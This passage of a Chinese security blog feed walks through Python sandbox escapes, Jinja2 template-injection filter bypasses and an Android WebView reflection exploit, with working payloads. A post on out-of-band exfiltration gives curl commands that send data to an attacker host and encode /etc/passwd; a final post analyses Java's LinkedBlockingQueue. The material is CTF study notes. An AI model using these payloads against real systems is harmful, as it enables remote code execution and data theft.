class="string">'file'</span>,</div><div class="line">              <span class="string">'execfile'</span>,</div><div class="line">              <span class="string">'compile'</span>,</div><div class="line">              <span class="string">'reload'</span>,</div><div class="line">              <span class="string">'__import__'</span>,</div><div class="line">              <span class="string">'eval'</span>,</div><div class="line">              <span class="string">'input'</span>]</div><div class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</div><div class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</div></pre></td></tr></table></figure><p><code>__import__</code>被删掉了，限制了对敏感模块的导入</p><p><code>reload</code>被删掉了，限制了对已有模块的重新导入，<code>reload(__builtins__)</code></p><p><code>open</code>被删掉了，限制文件读写</p><p><code>eval</code>被删掉了，限制字符代码执行</p><p>如果没有限制reload的话，就可以将<code>__builtins__</code>重新导入，但是在这种经典配置下，似乎我们目前只有下面这一种姿势去搞：</p><p>其实思路之前已经介绍过了，就是变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量 ，在这个流程中找到我们想要的模块或者函数。介绍一个简易的寻找代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">def findModule(srcmodule, dstmodule):</div><div class="line">    i = 0</div><div class="line">    results = srcmodule.__class__.__base__.__subclasses__()</div><div class="line">    for item in results:</div><div class="line">        i += 1</div><div class="line">        if '&lt;class' in str(item):</div><div class="line">            try:</div><div class="line">                modules = item.__init__.__globals__.keys()</div><div class="line">                for module in modules:</div><div class="line">                    # print module</div><div class="line">                    if dstmodule == module:</div><div class="line">                        print(item,i-1,str(srcmodule)+".__class__.__base__.__subclasses__()["+str(i-1)+"].__init__.__globals__['" + str(dstmodule) + "']")</div><div class="line">                        break</div><div class="line">            except:</div><div class="line">                pass</div><div class="line">              </div><div class="line">运行：</div><div class="line">findModule([],'os')</div><div class="line">输出：</div><div class="line">(&lt;class 'site._Printer'&gt;, 72, "[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os']")</div><div class="line">(&lt;class 'site.Quitter'&gt;, 77, "[].__class__.__base__.__subclasses__()[77].__init__.__globals__['os']")</div></pre></td></tr></table></figure><p>直接从Ben师傅那里搬运几个python2，3中常用的payload来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">python2：</div><div class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</div><div class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</div><div class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</div><div class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</div><div class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</div><div class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls")'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">python3：</div><div class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>]</div><div class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</div></pre></td></tr></table></figure><h3 id="通过对参数的匹配来进行过滤"><a href="#通过对参数的匹配来进行过滤" class="headerlink" title="通过对参数的匹配来进行过滤"></a>通过对参数的匹配来进行过滤</h3><p>通过字符匹配去做过滤，python写法那么多，我们采用不同的写法就好了，所以应对这种姿势的方法也是多种多样</p><ol><li><p>一般都会限制os，import</p><p>在上面提到过了两种魔术方法，可以通过字符的形式调用里面的属性，一旦能够通过字符去调用就很容易绕过了，比如最简单的’so’[::-1]就可以</p><p>对于import关键字过滤的话，可以考虑以下几个思路，<code>__builtins__</code>里面包含着import方法，借助之前提到的<code>__dict__</code>属性可以通过字符串编码绕过<code>__builtins__.__dict__[&#39;__impo&#39;+&#39;rt__&#39;](&#39;o&#39;+&#39;s&#39;)</code></p></li><li><p>限制<code>__ [] &#39;等各种字符</code> </p><p>本来我以为也能利用<code>__dict__</code>的方法，将payload中的属性转变为字符串来表示的，但一来<code>__dict__</code>自身就带有<code>__</code>，二来<code>__globals__ __subclasses__  __base__</code>这些并不是属性，无法使用<code>__dict__</code>，所以非模板注入的情况下，暂时没有找到绕过的方法</p><p>但是在Jinja2模板注入中，绕过是可行的：</p><ul><li><p>可以用<code>[].__class__[&#39;__base__&#39;]</code>来表示<code>[].__class__.__base__</code>，为了免去从变量到对象这一步则使用flask中的request对象，也就是<code>request[&#39;_&#39;+&#39;_base_&#39;+&#39;_&#39;]</code></p></li><li><p>如果不允许用[]，jinja2中的函数|attr()也可以代表属性，更推荐用这种</p><p><code>[]|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)</code></p></li><li><p>如果禁止使用引号，可以考虑使用request.args.para1参数来代表</p><p><code>url?mobancanshu=[]|attr(request.args.para1)&amp;para1=__class__</code></p><p>当然，如果<code>__</code>的检测是对全部传入参数的，还可以使用Jinja2中自带的链接函数<code>(&#39;a&#39;,&#39;b&#39;)|join</code>，所以最后的payload就是这样</p><p><code>mobancanshu=[]|attr((request.args.para1*2, request.args.para2, request.args.para1*2)|join)|attr((request.args.para1*2, request.args.para3, request.args.para1*2)|join)&amp;para1=_&amp;para2=class&amp;para3=base</code></p><p>再加一句，如果<code>|join</code>被过滤，其实还有个替代函数<code>mobancanshu=(request.args.para1)|format(request.args.pata2, request.args.pata2, request.args.pata2, request.args.pata2)&amp;para1=%s%sbase%s%s&amp;para2=_</code></p></li><li><p>在hctf中又看到了一些绕过的姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">过滤了：</div><div class="line">空格(%20)，回车(%0a)，&apos;__&apos;,&apos;[&apos;,&apos;]&apos;,&apos;os&apos;,&apos;&quot;&apos;,&quot;|[a-z]&quot;</div><div class="line">绕过方法：</div><div class="line">空格可以用tab(%09)绕过，|后不允许接a-z可以用%0c即|%0cattr，tab等绕过</div></pre></td></tr></table></figure></li></ul></li><li><p>接着上面提到的非模板注入下场景如果过滤了<code>__</code>暂时没有绕过方法这个话题，08067的比赛中有个有趣的场景</p><p>一个在线代码练习的网站，首先肯定不能禁用掉import，否则用户体验极差。。所以主要的过滤在基于字符的上面，过滤掉了<code>__</code>等字符，此时没必要执着在那个长长的魔术方法流程上了，用不了啦，<code>__builtins__</code>所提供的思路也用不了啦，既然是字符过滤，那么就考虑怎样使用字符形式的调用方法来绕过字符检测就好了。最开始自然想到eval，但是被删掉了。</p><p>解决方案是在import上下手，python中有很多内置模块可以import进去，我们可以在里面找到一些和eval类似的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 用于测试代码的运行时间，可以将运行语句以字符串形式写出来，类似exec</span></div><div class="line"><span class="keyword">import</span> timeit</div><div class="line">timeit.timeit(<span class="string">"__import__('os').system('ls')"</span>, number=<span class="number">1</span>)</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 一般用于显示各种配置信息，可以直接写命令</span></div><div class="line"><span class="keyword">import</span> platform</div><div class="line"><span class="keyword">print</span> platform.popen(<span class="string">'ls'</span>, mode=<span class="string">'r'</span>).read()</div></pre></td></tr></table></figure></li></ol><h2 id="Android中类似的绕过方式"><a href="#Android中类似的绕过方式" class="headerlink" title="Android中类似的绕过方式"></a>Android中类似的绕过方式</h2><p>相信大家对Android中的Webview漏洞都不陌生，其中通过Js代码来调用Java代码的addJavascriptInterface 接口引起远程代码执行漏洞的实现原理也类似于上面我们所说的Python沙盒绕过</p><p>首先通过Android中的addJavascriptInterface函数可以为要执行的js代码绑定一个Java对象，之后js代码就可以直接调用这个Java对象的所有公有接口，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">javascript.html</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">callAndroid</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="comment">// 由于对象映射，所以调用test对象等于调用Android映射的对象</span></div><div class="line">      test.hello(<span class="string">"js调用了android中的hello方法"</span>);</div><div class="line">   &#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">A.java</div><div class="line"></div><div class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></div><div class="line"><span class="comment">//参数1：Javascript对象名</span></div><div class="line"><span class="comment">//参数2：Java对象名</span></div><div class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> AndroidtoJs(), <span class="string">"test"</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></div><div class="line"></div><div class="line"><span class="comment">// 加载JS代码</span></div><div class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></div><div class="line">mWebView.loadUrl(<span class="string">"file:///android_asset/javascript.html"</span>);</div></pre></td></tr></table></figure><p>那么类似于上面python的绕过方式，在Java中我们可以通过Java的反射机制实现调用到其他的类：</p><ul><li>Android中的对象有一公共的方法：getClass() ，该方法可以获取到当前类，类型为Class</li><li>Class类有一关键的方法： Class.forName，可以用来加载一个指定的类</li><li>加载java.lang.Runtime 类，该类是可以执行本地命令的</li></ul><p>js代码可以如下书写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmdArgs</span>)  </span></div><div class="line">&#123;  </div><div class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></div><div class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></div><div class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>) &#123;  </div><div class="line">        <span class="keyword">if</span> (<span class="string">"getClass"</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;  </div><div class="line"></div><div class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></div><div class="line">            alert(obj);          </div><div class="line">            <span class="keyword">return</span>  <span class="built_in">window</span>[obj].getClass().forName(<span class="string">"java.lang.Runtime"</span>)  </div><div class="line"></div><div class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></div><div class="line">getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);  </div><div class="line"></div><div class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></div><div class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对python沙盒的编写以及现有几种常见的沙盒绕过策略的一点总结&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Out Of Band 带外攻击的一点总结</title>
    <link href="https://someonesometimes.github.io/2017/11/14/Out-Of-Band-%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://someonesometimes.github.io/2017/11/14/Out-Of-Band-带外攻击的一点总结/</id>
    <published>2017-11-14T14:51:05.000Z</published>
    <updated>2017-11-15T10:42:10.708Z</updated>
    
    <content type="html"><![CDATA[<p>在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用</p><a id="more"></a><h2 id="什么是带外攻击，应用场景有哪些？"><a href="#什么是带外攻击，应用场景有哪些？" class="headerlink" title="什么是带外攻击，应用场景有哪些？"></a>什么是带外攻击，应用场景有哪些？</h2><p>在很多攻击中，可能我们无法直接看到攻击的回显，也许攻击行为的确产生了，但数据并不一定能够回显到攻击者的眼中，这时候我们可以借助网络请求，将回显结果发送到我们的服务器上，就可以看到回显了，这种方式就叫做带外攻击</p><p>比较常见的使用场景有这些，如果我们无法直接看到攻击的回显，就可以考虑使用带外攻击来通过网络请求拿到回显数据</p><ul><li>命令执行</li><li>sql注入</li><li>XXE</li></ul><h2 id="介绍几个常用的接收回显的网站"><a href="#介绍几个常用的接收回显的网站" class="headerlink" title="介绍几个常用的接收回显的网站"></a>介绍几个常用的接收回显的网站</h2><ul><li><p>火日师傅在github上开源的<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">xss平台</a></p><p>好处是搭在自己的vps上面，修改使用起来都十分方便，而且记录的参数十分详细，cookie，post，get的数据都能拿到，问题是没法获得基于dns方式的数据，而且链接限制在了<a href="http://ip/xss/这样，url形式不能修改，只能改变传输的参数" target="_blank" rel="external">http://ip/xss/这样，url形式不能修改，只能改变传输的参数</a></p></li><li><p><a href="http://ceye.io" target="_blank" rel="external">ceye平台</a></p><p>应该是知道创宇的平台，为每个用户分配一个识别url，方便的地方是除了支持http链接接收，还可以通过dns方式接收回显，并且链接的形式比较随意，域名啊，后面的路径啊都随意，只要域名是基于为自己分配的指定url就可以。不太方便的地方就是貌似对http方式发送回显的接收结果中是看不到太详细的数据的。</p></li></ul><h2 id="带外攻击中两种回显信息发送方式"><a href="#带外攻击中两种回显信息发送方式" class="headerlink" title="带外攻击中两种回显信息发送方式"></a>带外攻击中两种回显信息发送方式</h2><h3 id="很常见的通过http方式发送，回显信息可以放在以下几个位置："><a href="#很常见的通过http方式发送，回显信息可以放在以下几个位置：" class="headerlink" title="很常见的通过http方式发送，回显信息可以放在以下几个位置："></a>很常见的通过http方式发送，回显信息可以放在以下几个位置：</h3><ul><li><a href="http://myip/id=xxxxx" target="_blank" rel="external">http://myip/id=xxxxx</a> get参数部分</li><li>curl –cookie id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>   放在cookie里</li><li>curl –data id=xxxx <a href="http://myip" target="_blank" rel="external">http://myip</a>    放在post参数</li><li><a href="http://myip/xxxx" target="_blank" rel="external">http://myip/xxxx</a> 放在路径里</li></ul><p>有一点要提醒的是，测试中看到，发送数据有换行的话，或多或少的都会有问题，因为建议将数据进行编码后再传输，比如在命令注入中可以使用<code>cat /etc/passwd | base64</code>来将回显结果进行编码</p><h3 id="通过DNS解析方式来获得回显"><a href="#通过DNS解析方式来获得回显" class="headerlink" title="通过DNS解析方式来获得回显"></a>通过DNS解析方式来获得回显</h3><p>这也是在HCTF中才知道的姿势（哎，感觉自己孤陋寡闻，真的好菜。。。）。大致原理是这样的，还是发送一个链接，我们将回显信息放到域名里去，大致就是<a href="http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据" target="_blank" rel="external">http://xxxx.myip/这种形式，服务器对于这种链接会首先进行DNS解析来拿到对应域名的IP才能发送IP报文，而这种DNS报我们是可以拿到的，就是通过上面介绍到的ceye平台，可以查询DNS报，也就是某个域名的解析记录，这样我们就可以拿到了回显的数据</a></p><p>但是DNS回显是有限制的，因为回显字符作为域名的一部分，就要遵守域名的规则，根据规定，只能使用英文字符，数字，-，且-不能用作开头和结尾，域名长度也限制在了63，这样看来，DNS携带比较适用于携带hash后密码这些数据</p><p>讲道理这种方式很明显没有直接通过http发送数据来的方便，但的确在某些时候只能用这种方式来对外发送请求将数据传输出来，通过对HCTF中那道sql题目的测试，可以发现loadfile(‘\\\\vips\x\‘?id=123)在平台上是接收不到请求的，从sql执行结果上看执行时间是0s，看来没有发送网络请求，只有我们换一个域名，在不同域名的时候，sql执行结果才会显示花费了一定的时间，看来是用来进行DNS查询了，在这种sql的带外攻击中，loadfile函数只能配合DNS方式的回显才能做到</p><h2 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h2><p>可以直接参见ceye的网站，里面有各种攻击场景下的payload，还是很全的</p><p><a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在上周的HCTF中的boring website题目中才第一次接触到了sql中的带外攻击，在网上收集资料整理了一些，再加上之前零碎的一些记录，想想还是记录一下目前自己对带外攻击的理解与应用范畴吧，当然并不只限于sql中的应用&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Java阻塞队列学习及LinkedBlockingQueue源码分析</title>
    <link href="https://someonesometimes.github.io/2017/10/23/Java%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97%E5%AD%A6%E4%B9%A0%E5%8F%8ALinkedBlockingQueue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://someonesometimes.github.io/2017/10/23/Java阻塞队列学习及LinkedBlockingQueue源码分析/</id>
    <published>2017-10-23T15:41:07.000Z</published>
    <updated>2017-10-24T11:08:38.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java阻塞队列"><a href="#Java阻塞队列" class="headerlink" title="Java阻塞队列"></a>Java阻塞队列</h2><p>最近在学习Java的多线程编程，对并发编程的认识也从之前用python写简单多线程程序里对并发代码块上锁，到生产者消费者模型，wait()，notify()，阻塞队列这些概念，那么这里要介绍的阻塞队列是什么呢？</p><p>考虑生产者消费者模型这种情况，在从队列中取元素与拿元素时加锁，但在这种场景下仅加锁是不够的，因为生产者往里面放元素的时候，还要考虑队列有没有满，如果已经满了的话就要wait一直到队列不满的时候再往里面放，消费者也是一样的，从队列里面拿元素的时候还要考虑队列是不是空的，如果是空的就要一直wait到非空的时候。注意这里我们就从加锁操作引出了wait(), notify()两个概念，在并发编程中结合这两个概念可以实现更多更精巧复杂的多线程场景。</p><p>好像扯得有点远，还没有说到我们要介绍的阻塞队列的概念，其实阻塞队列就源自于生产者消费者模型中所涉及到的场景，在多线程下很多场景都要有一些临界资源，这些资源可能被多个线程同时访问，所以就要进行加锁啊，wait()，notify()等操作，其实个人觉得加锁还好，就是将一个对临界资源操作的语句块圈起来就好，但要实现wait，notify操作就有些麻烦了，放东西的时候需要一直判断是不是满了，满了还要wait，然后操作完了后还要记得唤醒各种线程防止死锁等等，如果都自己实现的话就有点太麻烦了，更重要的是容易出错，所以这里就引入了阻塞队列的概念，不是临界资源的操作需要加锁，判满，判空等等各种操作嘛，那好，临界资源你直接用我给你写的类，我在类里面已经对所有需要处理的多线程场景进行了处理，使其变得线程安全了，使用这种类的话，自己完全不需要考虑多线程的线程安全问题，而这种类就是我们要介绍的阻塞队列。</p><a id="more"></a><h2 id="LinkedBlockingQueue源码分析"><a href="#LinkedBlockingQueue源码分析" class="headerlink" title="LinkedBlockingQueue源码分析"></a>LinkedBlockingQueue源码分析</h2><p>还是蛮幸运的，划分分析方向的时候我正好被分到去分析这个类，这个类用的场景还是挺多的，最经典的就是消费者生产者问题，所以在源码分析中我们可以接着结合生产者消费者这个场景来理解</p><h3 id="对LinkedBlockingQueue简单的介绍"><a href="#对LinkedBlockingQueue简单的介绍" class="headerlink" title="对LinkedBlockingQueue简单的介绍"></a>对LinkedBlockingQueue简单的介绍</h3><p>以下摘自Javadoc中的描述</p><blockquote><p> An optionally-bounded {@linkplain BlockingQueue blocking queue} based on<br> linked nodes.<br> This queue orders elements FIFO (first-in-first-out).<br> The <em>head</em> of the queue is that element that has been on the<br> queue the longest time.<br> The <em>tail</em> of the queue is that element that has been on the<br> queue the shortest time. New elements<br> are inserted at the tail of the queue, and the queue retrieval<br> operations obtain elements at the head of the queue.<br> Linked queues typically have higher throughput than array-based queues but<br> less predictable performance in most concurrent applications.</p><p> </p><p>The optional capacity bound constructor argument serves as a<br> way to prevent excessive queue expansion. The capacity, if unspecified,<br> is equal to {@link Integer#MAX_VALUE}.  Linked nodes are<br> dynamically created upon each insertion unless this would bring the<br> queue above capacity.</p></blockquote><p>简单翻译一下：</p><p>这是基于链式表的一个任意长度的队列。这个队列中元素的顺序基于FIFO先进先出的规则，也就是队列里的head元素是最早入队列的元素，队列的tail元素是最晚入队列的元素。新的元素会被插到队列的队尾，并且从队列中取元素的时候取得是队列的head。链式队列相比基于数组的队列具有更好的吞吐量但是在很多并发应用中缺少可预见的性能。</p><p>构造函数的参数中提供可选择的队列容量，则可以阻止队列无限的扩充。关于这个容量参数，如果没有特殊指定的话，就按照Integer类里面的MAX_VALUE值来指定（特意去看了下，那个上限值是0x7fffffff）。链表的节点在插入的时候都是动态生成的除非队列的容量达到了之前指定的上限值</p><h3 id="这种链表队列与我们之前使用的链表有什么不同？"><a href="#这种链表队列与我们之前使用的链表有什么不同？" class="headerlink" title="这种链表队列与我们之前使用的链表有什么不同？"></a>这种链表队列与我们之前使用的链表有什么不同？</h3><p>其实基本都是差不多的啦，我们在链表里能够使用的方法在这个类里面也基本都实现了，只是在实现中需要考虑到如何实现线程安全这一部分的代码。从类的声明中我们可以看到这个类的就是从<code>AbstractQueue&lt;E&gt;</code>中继承的方法，同时实现了阻塞队列<code>BlockingQueue</code>所规定的一些接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedBlockingQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractQueue</span>&lt;<span class="title">E</span>&gt;</span></div><div class="line">        <span class="keyword">implements</span> <span class="title">BlockingQueue</span>&lt;<span class="title">E</span>&gt;, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></div></pre></td></tr></table></figure><h3 id="LinkeBlockingQueue的成员变量以及一些私有方法"><a href="#LinkeBlockingQueue的成员变量以及一些私有方法" class="headerlink" title="LinkeBlockingQueue的成员变量以及一些私有方法"></a>LinkeBlockingQueue的成员变量以及一些私有方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> <span class="comment">//链表的节点对象定义，每个节点有一个存储元素的变量item，还引用节点类型的变量</span></div><div class="line"> <span class="comment">//next用于指向下一个节点。</span></div><div class="line"> <span class="comment">//构造方法可以为此节点存储的元素item赋值</span></div><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</div><div class="line">    E item;</div><div class="line"></div><div class="line">    Node&lt;E&gt; next;</div><div class="line"></div><div class="line">    Node(E x) &#123; item = x; &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//用于保存链表队列的最大长度，之前的简介里也已经提到过了，如果没有特殊指定的话，就用</span></div><div class="line"><span class="comment">//Integer.MAX_VALUE，也就是0x7fffffff </span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> capacity;</div><div class="line"></div><div class="line"><span class="comment">//count代表当前链表中元素的数量。需要特别指出来的是，这里并不是一个简单的int类型，</span></div><div class="line"><span class="comment">//而是用的AtomicIntegerler类型，这是种原子类型，所有的操作都是连续完成的，</span></div><div class="line"><span class="comment">//不会受到干扰，如果不清楚的话，只要知道这个对这个类型的操作是线程安全的就行了。</span></div><div class="line"><span class="comment">//为什么要用这种类型呢，直接用int难道不行？是这样的，LinkedBlockingQueue支持同时</span></div><div class="line"><span class="comment">//往一个队列里面放元素与取元素，这一点马上就会在下面的分析中得到佐证。所以如果能</span></div><div class="line"><span class="comment">//同时存取的话，count值就有可能被同时操作，所以我们要把它设置成原子类型以保证</span></div><div class="line"><span class="comment">//count这个临界资源的线程安全</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger count = <span class="keyword">new</span> AtomicInteger();</div><div class="line"></div><div class="line"><span class="comment">//链表的头，也就是取出数据的位置，head节点的item变量是恒为null的，next则指向下一个节点</span></div><div class="line"><span class="keyword">transient</span> Node&lt;E&gt; head;</div><div class="line"></div><div class="line"><span class="comment">//链表的尾节点，也就是添加数据的位置，last节点的next变量是恒为null的，</span></div><div class="line"><span class="comment">//item则存放着最后一个元素，也就是最新进入队列的值</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Node&lt;E&gt; last;</div><div class="line"></div><div class="line"><span class="comment">//此对象在运行take，poll方法的时候需要加的锁，也就是取锁，防止另一个取进程同时进行操作</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock takeLock = <span class="keyword">new</span> ReentrantLock();</div><div class="line"></div><div class="line"><span class="comment">//属于取锁takeLock的变量，有await()与signal()方法，用于实现取东西的时候为空所要等待</span></div><div class="line"><span class="comment">//以及取完后唤醒其他取东西进程的两种操作 </span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> Condition notEmpty = takeLock.newCondition();</div><div class="line"></div><div class="line"><span class="comment">//此对象在运行put，offer方法的时候要加的锁，也就是放东西的时候要加上的锁，</span></div><div class="line"><span class="comment">//防止另一个放东西进程同时进行操作这里应该就很明显能够看出来了，在队列中拿东西与</span></div><div class="line"><span class="comment">//放东西使用的是两个不同的锁，所以是支持这两个进程同时操作的</span></div><div class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReentrantLock putLock = <span class="keyword">new</span> ReentrantLock();</div><div class="line"></div><div class="line"><span class="comment">//属于放东西锁的变量，与notEmpty差不多用途，用于实现放东西时队列为满则等待</span></div><div class="line"><span 